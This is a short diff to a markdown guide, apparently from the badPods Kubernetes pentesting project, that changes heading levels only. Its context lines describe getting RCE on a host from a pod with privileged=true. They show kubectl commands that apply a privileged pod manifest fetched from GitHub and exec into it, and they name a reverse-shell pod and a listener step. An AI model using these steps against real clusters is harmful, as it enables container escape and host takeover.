@@ -4,7 +4,7 @@ If you only have `privileged=true`, you can still get RCE on the host, and ultim
 
 # Pod Creation
 
-### Create a pod you can exec into
+## Create a pod you can exec into
 ```yaml
 apiVersion: v1
 kind: Pod
@@ -40,7 +40,7 @@ kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/p
 kubectl -n [namespace] exec -it pod-priv-only -- bash
 ```
 
-### Or, create a reverse shell pod
+## Or, create a reverse shell pod
 [pod-priv-only-revshell.yaml](pod-priv-only-revshell.yaml)
 
 #### Set up listener
